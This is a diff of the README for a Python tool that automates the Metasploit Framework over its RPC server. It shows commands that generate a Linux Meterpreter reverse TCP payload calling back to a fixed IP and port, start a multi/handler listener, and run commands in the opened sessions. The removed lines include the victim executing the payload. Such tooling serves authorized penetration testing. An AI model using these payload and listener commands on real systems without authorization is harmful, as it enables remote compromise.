@@ -1,17 +1,17 @@
-
-
 # RyoTenkai: Metasploit RPC Automation Tool
 
-This Python tool is designed to automate tasks within the Metasploit Framework using the `pymetasploit3` library, allowing for interaction with the Metasploit RPC server. The tool provides functionalities such as running exploits, polling jobs and sessions, interacting with open sessions, and generating payloads using `msfvenom`.
+**RyoTenkai** is a Python tool designed to automate tasks within the Metasploit Framework using the `pymetasploit3` library. It facilitates interaction with the Metasploit RPC server, offering functionalities such as running exploits, polling jobs and sessions, interacting with open sessions, and generating payloads using `msfvenom`. 
+
+All outputs are provided in **structured JSON format**, which can be easily consumed by other tools like Ansible or any automation systems.
 
 ## Features
 
-- **Start Metasploit RPC server**: Start the RPC server with user-specified credentials and port.
-- **Run any Metasploit module**: Execute Metasploit modules and retrieve their output.
-- **Poll active jobs**: View currently active jobs in the Metasploit instance.
-- **Poll active sessions**: View currently active sessions.
-- **Access a session and run a command**: Interact with an active session and run commands within it.
-- **Generate payloads using msfvenom**: Create payloads in various formats (e.g., ELF, EXE) for use with Metasploit modules.
+- **Start Metasploit RPC server**: Start the RPC server with user-specified credentials and port, and receive the response as JSON.
+- **Run any Metasploit module**: Execute Metasploit modules with specified options and get both raw and filtered output in JSON format.
+- **Poll active jobs**: View currently active jobs, returned as JSON.
+- **Poll active sessions**: View currently active sessions as structured JSON output.
+- **Access a session and run a command**: Interact with an active session, run a command, and retrieve the result as JSON.
+- **Generate payloads using msfvenom**: Create payloads in various formats (e.g., ELF, EXE) for use with Metasploit modules, with JSON output indicating success or failure.
 
 ## Requirements
 
@@ -99,11 +99,67 @@ All commands share the following common arguments:
 - `--rpc-port`: The Metasploit RPC server port (default: `55552`).
 - `--rpc-ssl`: Use SSL for RPC connection (default: `False`).
 
-These arguments can be overridden via command line or specified in `config.ini`.
+These arguments can be overridden via the command line or specified in `config.ini`.
 
-### Example Use Case: Full Workflow
+### Available Commands
 
-This example demonstrates the complete workflow of starting the Metasploit RPC server, generating a payload, setting up a listener, polling jobs, confirming a session is open, and interacting with the session.
+1. **Start the Metasploit RPC Server**:
+
+    ```bash
+    python ryotenkai.py start_rpc --rpc-password msfrpc --rpc-port 55559
+    ```
+
+    This starts the Metasploit RPC server on port `55559` with the password `msfrpc`. Output is in JSON format.
+
+2. **Run a Metasploit Module**:
+
+    ```bash
+    python ryotenkai.py run_module <module> --option 'OPTION=VALUE' --msf-password msfrpc --rpc-server 10.192.0.3 --rpc-port 55559 --rpc-ssl
+    ```
+
+    Example:
+
+    ```bash
+    python ryotenkai.py run_module exploit/multi/handler --option 'PAYLOAD=linux/x64/meterpreter/reverse_tcp' --option 'LHOST=10.192.0.3' --option 'LPORT=12344'
+    ```
+
+    This runs the `multi/handler` module with the specified payload options, returning the result in JSON.
+
+3. **Poll Active Jobs**:
+
+    ```bash
+    python ryotenkai.py get_jobs --msf-password msfrpc --rpc-server 10.192.0.3 --rpc-port 55559 --rpc-ssl
+    ```
+
+    This retrieves the list of active jobs in JSON format.
+
+4. **Poll Active Sessions**:
+
+    ```bash
+    python ryotenkai.py get_sessions --msf-password msfrpc --rpc-server 10.192.0.3 --rpc-port 55559 --rpc-ssl
+    ```
+
+    This retrieves the list of active sessions in JSON format.
+
+5. **Run a Command in a Session**:
+
+    ```bash
+    python ryotenkai.py run_command 1 ifconfig --msf-password msfrpc --rpc-server 10.192.0.3 --rpc-port 55559 --rpc-ssl
+    ```
+
+    This runs the `ifconfig` command in session `1` and returns the result in JSON.
+
+6. **Generate a Payload**:
+
+    ```bash
+    python ryotenkai.py generate_payload elf linux/x64/meterpreter/reverse_tcp 10.192.0.3 12344 /tmp/payload.sh --msf-password msfrpc --rpc-port 55559 --rpc-server 10.192.0.3 --rpc-ssl
+    ```
+
+    This generates a Linux Meterpreter reverse TCP payload in ELF format, saving it to `/tmp/payload.sh`. Output is in JSON.
+
+### Example Workflow
+
+This example demonstrates the full workflow:
 
 #### 1. Start the Metasploit RPC Server
 
@@ -111,62 +167,65 @@ This example demonstrates the complete workflow of starting the Metasploit RPC s
 python ryotenkai.py start_rpc --rpc-password msfrpc --rpc-port 55559
 ```
 
-This command will start the Metasploit RPC server on port `55559` with the password `msfrpc`.
-
 #### 2. Generate a Payload
 
 ```bash
-python ryotenkai.py generate_payload elf linux/x64/meterpreter/reverse_tcp 10.192.0.3 12344 /tmp/payload.sh --msf-password msfrpc --rpc-port 55559 --rpc-server 10.192.0.3 --rpc-ssl
+python ryotenkai.py generate_payload elf linux/x64/meterpreter/reverse_tcp 10.192.0.3 12344 /tmp/payload.sh
 ```
 
-This command generates a Linux Meterpreter reverse TCP payload in ELF format with the following parameters:
-- LHOST: `10.192.0.3`
-- LPORT: `12344`
-- Output file: `/tmp/payload.sh`
-
-The victim machine will run this payload to initiate a reverse connection.
-
-#### 3. Run the Listener (Metasploit Handler)
+#### 3. Run the Listener
 
 ```bash
-python ryotenkai.py run_module multi/handler --option 'PAYLOAD=linux/x64/meterpreter/reverse_tcp' --option 'LHOST=10.192.0.3' --option 'LPORT=12344' --msf-password msfrpc --rpc-port 55559 --rpc-server 10.192.0.3 --rpc-ssl
+python ryotenkai.py run_module multi/handler --option 'PAYLOAD=linux/x64/meterpreter/reverse_tcp' --option 'LHOST=10.192.0.3' --option 'LPORT=12344'
 ```
 
-This command sets up a listener using the `multi/handler` module, waiting for the reverse shell connection from the victim.
-
-#### 4. Poll Jobs to Confirm Listener is Active
+#### 4. Poll Jobs
 
 ```bash
-python ryotenkai.py get_jobs --msf-password msfrpc --rpc-server 10.192.0.3 --rpc-port 55559 --rpc-ssl
+python ryotenkai.py get_jobs
 ```
 
-This command checks the active jobs in Metasploit, confirming that the listener (handler) is running.
-
-#### 5. Victim Executes the Payload
-
-On the victim machine, the payload script generated in step 2 is executed:
+#### 5. Poll Sessions
 
 ```bash
-sh /tmp/payload.sh
+python ryotenkai.py get_sessions
 ```
 
-This triggers the reverse shell connection to the Metasploit listener.
-
-#### 6. Poll Sessions to Confirm a Session is Open
+#### 6. Run a Command on an Active Session
 
 ```bash
-python ryotenkai.py get_sessions --msf-password msfrpc --rpc-server 10.192.0.3 --rpc-port 55559 --rpc-ssl
+python ryotenkai.py run_command 1 ifconfig
 ```
 
-This command polls the active sessions in Metasploit, confirming that a Meterpreter session has been opened with the victim.
+## JSON Outputs
 
-#### 7. Run a Command in the Session
+All core functionalities return outputs in structured JSON format. This ensures easy integration with automation tools like Ansible.
 
-```bash
-python ryotenkai.py run_command 1 ifconfig --msf-password msfrpc --rpc-server 10.192.0.3 --rpc-port 55559 --rpc-ssl
+### Example JSON Output for Generating a Payload:
+
+```json
+{
+    "status": "success",
+    "message": "Payload saved to /tmp/payload.sh",
+    "details": {
+        "format": "elf",
+        "payload": "linux/x64/meterpreter/reverse_tcp",
+        "lhost": "10.192.0.3",
+        "lport": "12344",
+        "output_file": "/tmp/payload.sh"
+    }
+}
 ```
 
-This command accesses session ID `1` and runs the `ifconfig` command, retrieving the network interface details of the victim.
+### Example JSON Output for Running a Command in a Session:
+
+```json
+{
+    "session_id": "1",
+    "command": "ifconfig",
+    "result": "eth0      Link encap:Ethernet  HWaddr 00:50:56:aa:bb:cc"
+}
+```
 
 ## Logging
 
@@ -175,4 +234,3 @@ The script uses Python's logging module to provide detailed information about th
 ## License
 
 This project is licensed under the MIT License. See the LICENSE file for more information.
-
